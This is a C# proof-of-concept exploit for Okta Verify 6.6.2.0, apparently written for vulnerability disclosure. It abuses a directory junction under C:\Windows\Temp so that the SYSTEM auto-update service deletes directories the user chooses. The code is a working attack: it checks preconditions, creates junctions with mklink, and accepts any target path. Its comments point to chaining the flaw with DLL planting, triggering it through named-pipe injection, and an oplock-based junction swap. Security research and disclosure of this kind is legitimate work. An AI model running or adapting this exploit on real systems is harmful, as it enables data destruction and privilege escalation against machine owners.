// Okta Verify 6.6.2.0 - Arbitrary Directory Deletion via Junction PoC
//
// VULNERABILITY: The Okta Auto Update Service (runs as NT AUTHORITY\SYSTEM)
// calls Helper.CleanPreviousDownloads() which recursively enumerates and
// deletes subdirectories under C:\Windows\Temp\Okta-AutoUpdate\
//
// The Okta-AutoUpdate directory does NOT exist on fresh installations.
// BUILTIN\Users has CreateFiles+AppendData on C:\Windows\Temp (with
// container inherit), so ANY local user can pre-create Okta-AutoUpdate
// as a DIRECTORY JUNCTION pointing to an arbitrary target directory.
//
// When the SYSTEM service calls CleanPreviousDownloads():
//   1. Directory.Exists("C:\Windows\Temp\Okta-AutoUpdate") returns true
//      (follows junction to target)
//   2. Directory.GetDirectories(path, "*", AllDirectories) enumerates
//      subdirectories of the TARGET through the junction
//   3. Directory.Delete(subdirPath, recursive: true) deletes actual
//      target subdirectories AS SYSTEM
//
// IMPACT: Arbitrary directory deletion as SYSTEM (LPE primitive)
// This can be chained with DLL planting to achieve code execution.
//
// PREREQUISITES: Standard local user account, no admin required
//
// Compile: csc /out:OktaJunctionPoC.exe okta-junction-deletion-poc.cs
// Run: OktaJunctionPoC.exe [target_directory]
//   Default target: C:\OktaPoCTarget (safe test directory)
//
// NOTE: This PoC creates the junction but does NOT trigger the deletion.
// The deletion is triggered by the SYSTEM service's next update check
// (every 3600 seconds by default, or triggered via named pipe injection).

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace OktaJunctionPoC
{
    class Program
    {
        const string OKTA_UPDATE_DIR = @"C:\Windows\Temp\Okta-AutoUpdate";

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern bool CreateSymbolicLinkW(string lpSymlinkFileName, string lpTargetFileName, int dwFlags);

        static void Main(string[] args)
        {
            string targetDir = args.Length > 0 ? args[0] : @"C:\OktaPoCTarget";

            Console.WriteLine("=== Okta Verify Junction Deletion PoC ===");
            Console.WriteLine($"Running as: {WindowsIdentity.GetCurrent().Name}");
            Console.WriteLine($"Elevated: {new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)}");
            Console.WriteLine();

            // Step 1: Verify preconditions
            Console.WriteLine("[*] Step 1: Checking preconditions...");

            if (Directory.Exists(OKTA_UPDATE_DIR))
            {
                var attrs = File.GetAttributes(OKTA_UPDATE_DIR);
                if ((attrs & FileAttributes.ReparsePoint) != 0)
                {
                    Console.WriteLine($"[!] {OKTA_UPDATE_DIR} already exists as a reparse point!");
                    Console.WriteLine("    Someone may have already set up this attack.");
                }
                else
                {
                    Console.WriteLine($"[-] {OKTA_UPDATE_DIR} exists as a regular directory.");
                    Console.WriteLine("    The service has already run. Attack requires the directory");
                    Console.WriteLine("    to not exist (pre-creation race) OR to create a junction");
                    Console.WriteLine("    INSIDE the existing directory.");
                    Console.WriteLine();
                    TryInternalJunction(targetDir);
                    return;
                }
            }
            else
            {
                Console.WriteLine($"[+] {OKTA_UPDATE_DIR} does not exist - perfect for attack!");
            }
            Console.WriteLine();

            // Step 2: Create test target if using default
            if (targetDir == @"C:\OktaPoCTarget")
            {
                Console.WriteLine("[*] Step 2: Creating safe test target directory...");
                Directory.CreateDirectory(targetDir);
                Directory.CreateDirectory(Path.Combine(targetDir, "subdir1"));
                Directory.CreateDirectory(Path.Combine(targetDir, "subdir2"));
                File.WriteAllText(Path.Combine(targetDir, "subdir1", "test.txt"), "This file should be deleted by SYSTEM");
                File.WriteAllText(Path.Combine(targetDir, "subdir2", "test.txt"), "This file should also be deleted");
                Console.WriteLine($"[+] Created {targetDir} with test subdirectories");
                Console.WriteLine();
            }
            else
            {
                Console.WriteLine($"[*] Step 2: Using specified target: {targetDir}");
                if (!Directory.Exists(targetDir))
                {
                    Console.WriteLine($"[-] Target directory does not exist: {targetDir}");
                    return;
                }
                Console.WriteLine("[!] WARNING: Contents of this directory WILL be deleted by SYSTEM!");
                Console.WriteLine("    Press Enter to continue or Ctrl+C to abort...");
                Console.ReadLine();
            }

            // Step 3: Create the junction
            Console.WriteLine("[*] Step 3: Creating junction...");
            Console.WriteLine($"    {OKTA_UPDATE_DIR} -> {targetDir}");

            try
            {
                // Use cmd /c mklink /J (works for standard users)
                var psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c mklink /J \"{OKTA_UPDATE_DIR}\" \"{targetDir}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                var proc = Process.Start(psi);
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                if (proc.ExitCode == 0 && Directory.Exists(OKTA_UPDATE_DIR))
                {
                    var attrs = File.GetAttributes(OKTA_UPDATE_DIR);
                    Console.WriteLine($"[+] Junction created successfully!");
                    Console.WriteLine($"    Attributes: {attrs}");
                    Console.WriteLine($"    Is ReparsePoint: {(attrs & FileAttributes.ReparsePoint) != 0}");
                }
                else
                {
                    Console.WriteLine($"[-] Failed to create junction.");
                    Console.WriteLine($"    stdout: {output}");
                    Console.WriteLine($"    stderr: {error}");
                    return;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.Message}");
                return;
            }

            Console.WriteLine();

            // Step 4: Explain what happens next
            Console.WriteLine("[*] Step 4: Junction is set. Attack status:");
            Console.WriteLine();
            Console.WriteLine("    The Okta Auto Update Service (SYSTEM) will call");
            Console.WriteLine("    CleanPreviousDownloads() on its next update cycle.");
            Console.WriteLine();
            Console.WriteLine("    When it does:");
            Console.WriteLine($"    1. Directory.Exists(\"{OKTA_UPDATE_DIR}\") -> TRUE");
            Console.WriteLine($"       (follows junction to {targetDir})");
            Console.WriteLine("    2. GetDirectories() enumerates target's subdirectories");
            Console.WriteLine("    3. Directory.Delete() deletes them AS SYSTEM");
            Console.WriteLine();
            Console.WriteLine("    The update cycle runs every 3600 seconds (1 hour).");
            Console.WriteLine("    To trigger immediately, inject a message via the named pipe:");
            Console.WriteLine("    OktaPipePoC.exe inject");
            Console.WriteLine();
            Console.WriteLine("[*] Monitoring target directory for changes...");
            Console.WriteLine($"    Target: {targetDir}");

            // List current contents
            Console.WriteLine();
            Console.WriteLine("    Current contents:");
            foreach (var dir in Directory.GetDirectories(targetDir, "*", SearchOption.AllDirectories))
            {
                Console.WriteLine($"      [DIR]  {dir}");
            }
            foreach (var file in Directory.GetFiles(targetDir, "*", SearchOption.AllDirectories))
            {
                Console.WriteLine($"      [FILE] {file}");
            }

            Console.WriteLine();
            Console.WriteLine("[*] Press Enter to clean up junction (remove without deleting target)...");
            Console.ReadLine();

            // Cleanup: remove junction without affecting target
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c rmdir \"{OKTA_UPDATE_DIR}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                };
                Process.Start(psi).WaitForExit();
                Console.WriteLine("[+] Junction removed.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Cleanup failed: {ex.Message}");
            }
        }

        static void TryInternalJunction(string targetDir)
        {
            Console.WriteLine();
            Console.WriteLine("[*] Alternative attack: Create junction INSIDE existing directory");
            Console.WriteLine("    If the Okta-AutoUpdate dir exists but inherits C:\\Windows\\Temp");
            Console.WriteLine("    ACLs (CreateFiles for Users), we can create junctions inside it.");
            Console.WriteLine();

            string internalJunction = Path.Combine(OKTA_UPDATE_DIR, "evil_junction");
            Console.WriteLine($"    Attempting: {internalJunction} -> {targetDir}");

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c mklink /J \"{internalJunction}\" \"{targetDir}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                var proc = Process.Start(psi);
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                if (proc.ExitCode == 0)
                {
                    Console.WriteLine("[+] Internal junction created!");
                    Console.WriteLine("    However, CleanPreviousDownloads iterates parent-first,");
                    Console.WriteLine("    so the junction point itself gets deleted before its");
                    Console.WriteLine("    children are processed. This limits exploitation.");
                    Console.WriteLine();
                    Console.WriteLine("    Advanced technique: Use NTFS oplock on a file inside the");
                    Console.WriteLine("    junction to pause deletion, then swap the junction target.");
                }
                else
                {
                    Console.WriteLine($"[-] Failed: {error}");
                    Console.WriteLine("    The directory ACL may not allow standard user writes.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.Message}");
            }
        }
    }
}
